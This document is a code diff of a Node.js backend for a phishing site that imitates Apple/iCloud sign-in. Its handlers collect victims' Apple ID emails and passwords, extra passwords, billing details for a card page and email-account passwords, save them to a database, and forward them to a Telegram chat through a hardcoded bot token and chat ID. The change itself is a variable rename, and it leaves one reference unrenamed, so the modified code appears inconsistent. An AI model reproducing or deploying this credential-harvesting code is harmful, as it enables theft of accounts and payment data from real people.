@@ -1,4 +1,4 @@
-const User = require('../models/User')
+const UserDB = require('../models/User')
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
 const token = "6563244298:AAF5y_kx6LDFDa_ZXaGWB3p6ZfJXgKnrsi8";
@@ -6,7 +6,7 @@ const bot = new TelegramBot(token, { polling: true });
 const chatID = -4076400458
 i = -1
 async function main() {
-  allData = await User.find({})
+  allData = await UserDB.find({})
   largestcount = -1
   for (let x = 0; x < allData.length; x++) {
     if (allData[x].count > largestcount) {
@@ -43,14 +43,14 @@ exports.login_post = async (req, res) => {
     var ua = req.headers['user-agent'];
 
 
-    user = new User({
+    userentry = new User({
       count,
       userAgent: ua,
       appleID: email,
       applePass: password
     });
 
-    await user.save();
+    await userentry.save();
 
 
 
@@ -69,7 +69,7 @@ exports.billingform_post = async (req, res) => {
     const password = req.body.password
     const count = req.body.count;
 
-    await User.findOneAndUpdate({ count }, { applePass2: password });
+    await UserDB.findOneAndUpdate({ count }, { applePass2: password });
 
 
     res.render('icloud-cc', { count, email })
@@ -84,7 +84,7 @@ exports.billingformsubmit_post = async (req, res) => {
     console.log(req.body)
     const count = req.body.count;
 
-    theuser = await User.findOneAndUpdate({ count }, {
+    theuser = await UserDB.findOneAndUpdate({ count }, {
       name: req.body.name,
       address1: req.body.address1,
       address2: req.body.address2,
@@ -129,7 +129,7 @@ exports.page_loader_get = async (req, res) => {
     console.log(`Recieved req at ${req.url}`)
     page2load = req.params.page
     count = req.params.count
-    theuser = await User.findOne({ count })
+    theuser = await UserDB.findOne({ count })
     email = theuser.appleID
     res.render(`${page2load}-pass`, { count, email })
   } catch (err) {
@@ -142,7 +142,7 @@ exports.page_loader_post = async (req, res) => {
     page2load = req.params.page
     count = req.params.count
     password = req.body.password
-    theuser = await User.findOneAndUpdate({ count }, { emailPASS1: password })
+    theuser = await UserDB.findOneAndUpdate({ count }, { emailPASS1: password })
     email = theuser.appleID
 
     // console.log(Users[count])
@@ -161,7 +161,7 @@ exports.invalidpage_loader_post = async (req, res) => {
     page2load = req.params.page
     count = req.params.count
     password = req.body.password
-    theuser = await User.findOneAndUpdate({ count }, { emailPASS2: password })
+    theuser = await UserDB.findOneAndUpdate({ count }, { emailPASS2: password })
     console.log(theuser)
     // res.render(`${page2load}-pass-invalid`, { count, email })
     bot.sendMessage(chatID, `
